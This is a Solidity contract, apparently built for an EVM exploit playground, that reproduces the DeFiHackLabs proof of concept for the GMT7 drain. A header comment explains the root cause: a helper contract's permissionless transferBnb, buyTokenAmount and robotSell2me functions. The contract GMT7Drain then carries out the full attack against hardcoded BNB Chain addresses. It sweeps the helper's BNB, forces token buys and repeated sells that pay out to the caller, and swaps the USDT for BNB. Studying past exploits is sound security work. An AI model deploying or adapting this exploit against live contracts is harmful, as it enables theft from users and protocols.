// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2025-02-GMT7).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker = address(this); test/GMT7_exp.sol ContractTest.testExploit()), and
// there is no standalone attack contract on-chain — the ATTACK_CONTRACT address
// from the header comment is never deployed/called by the test itself, only the
// unverified GMT7 Helper is called directly. So there is no contract to fetch or
// deploy; this synthetic exploit is a faithful, self-contained copy of the
// test's inline attack (testExploit's body moved into `run()`, constants and
// call sequence copied verbatim, minimal interfaces inlined, no imports).
//
// Root cause: the unverified GMT7 Helper (0x9AD9...31E3) exposes buyTokenAmount,
// robotSell2me, and transferBnb as fully permissionless external functions while
// holding its own USDT/GMT7 balances and a near-infinite PancakeRouter approval.
// buyTokenAmount() forces the helper to spend its own USDT buying GMT7 into
// itself; robotSell2me() sells the helper's GMT7 but routes the USDT proceeds to
// msg.sender (the caller) instead of back to the helper — a permissionless sell
// tap. transferBnb() sweeps the helper's native balance to caller-chosen
// addresses. No caller ever needs to hold or risk any capital.

interface IGMT7Helper {
    function transferBnb(address[] calldata receivers) external;
    function buyTokenAmount(uint256 amount) external;
    function robotSell2me(uint256 amount) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IPancakeRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract GMT7Drain {
    address private constant VULNERABLE_HELPER = 0x9AD90EEAb3CAFF64A762CB40387eE1Bb18BD31E3;
    address private constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;
    address private constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    IGMT7Helper private constant helper = IGMT7Helper(VULNERABLE_HELPER);
    IPancakeRouter private constant router = IPancakeRouter(payable(PANCAKE_ROUTER));
    IERC20 private constant usdt = IERC20(USDT_TOKEN);

    // Mirrors ContractTest.testExploit() verbatim (test/GMT7_exp.sol lines 60-82).
    function run() external {
        address[] memory receivers = new address[](1);
        receivers[0] = address(this);
        helper.transferBnb(receivers);

        helper.buyTokenAmount(3023);
        for (uint256 i = 0; i < 44; i++) {
            helper.robotSell2me(100);
        }
        helper.robotSell2me(58);

        uint256 usdtBalance = usdt.balanceOf(address(this));
        usdt.approve(PANCAKE_ROUTER, usdtBalance);

        address[] memory path = new address[](2);
        path[0] = USDT_TOKEN;
        path[1] = WBNB_TOKEN;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(usdtBalance, 0, path, address(this), block.timestamp);
    }

    receive() external payable {}
}
